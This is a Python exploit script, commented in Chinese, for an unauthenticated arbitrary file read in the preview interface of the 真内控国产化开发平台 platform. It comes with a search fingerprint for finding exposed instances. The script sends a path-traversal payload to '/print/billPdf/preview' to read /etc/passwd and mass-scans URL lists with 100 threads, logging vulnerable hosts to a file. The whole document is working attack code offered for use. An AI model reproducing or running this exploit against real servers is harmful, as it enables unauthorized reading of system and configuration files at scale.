#真内控国产化开发平台 preview 任意文件读取漏洞
#真内控国产化平台 preview接口存在任意文件读取漏洞，未经身份验证的攻击者可以通过构造精心设计的请求，成功利用漏洞读取服务器上的任意文件，包括敏感系统文件和应用程序配置文件等。导致系统处于极不安全的状态。
#body="js/npm.echarts.js" ZNKGCH_preview_Arbitrary-file-reading.py
# 导包
import requests,sys,argparse,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings() # 校验证书错的时候防止报错
from colorama import Fore, Style
BLUE = Fore.BLUE
RESET = Style.RESET_ALL
# 指纹模块
def banner():
    banner = """
     █████                      ██████   ██████
    ░░███                      ░░██████ ██████
     ░███        ██████   ██████░███░█████░███
     ░███       ░░░░░███ ███░░██░███░░███ ░███
     ░███        ███████░███ ░██░███ ░░░  ░███
     ░███      ████░░███░███ ░██░███      ░███
     ██████████░░███████░░███████████     █████ 
"""
    print(banner)
# 主函数模块
def main():
    # 先调用指纹
    banner()
    # 描述信息
    parser = argparse.ArgumentParser(description="this is a 真内控国产化开发平台 preview 任意文件读取漏洞")
    # -u指定单个url检测， -f指定批量url进行检测
    parser.add_argument('-u','--url',dest='url',help='please input your attack-url',type=str)
    parser.add_argument('-f','--file',dest='file',help='please input your attack-url.txt',type=str)
    # 重新填写变量url，方便最后测试完成将结果写入文件内时调用
    # 调用
    args = parser.parse_args()
    # 判断输入的是单个url还是批量url，若单个不开启多线程，若多个则开启多线程
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip().replace("\n",""))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

# poc模块
def poc(target):
    payload_url ="/print/billPdf/preview?urlPath=../../../../../../../../../../../../../../etc/passwd"
    url = target+payload_url
    headers = {
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0',
        'Accept':'application/json, text/javascript, */*; q=0.01',
        'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding':'gzip, deflate',
        'Connection':'close',
    }
    try:
        res = requests.get(url=url,headers=headers,verify=False,timeout=5)
        if res.status_code == 200 and 'root' in res.text:
            print(f"{BLUE}[+]该{target}存在漏洞{RESET}")
            with open ('result.txt','a',encoding='utf-8') as fp:
                fp.write(target+"\n")
        else :
            print(f"[-]该{target}不存在漏洞")
            with open ('without-bug.txt','a',encoding='utf-8') as fp:
                fp.write(target+"\n")        
    except Exception as e:
        print(f"[*]该url存在问题{target}"+str(e))
        with open ('warning.txt','a',encoding='utf-8') as fp:
            fp.write(target+"\n")

# 主函数入口
if __name__ == "__main__":
    main()
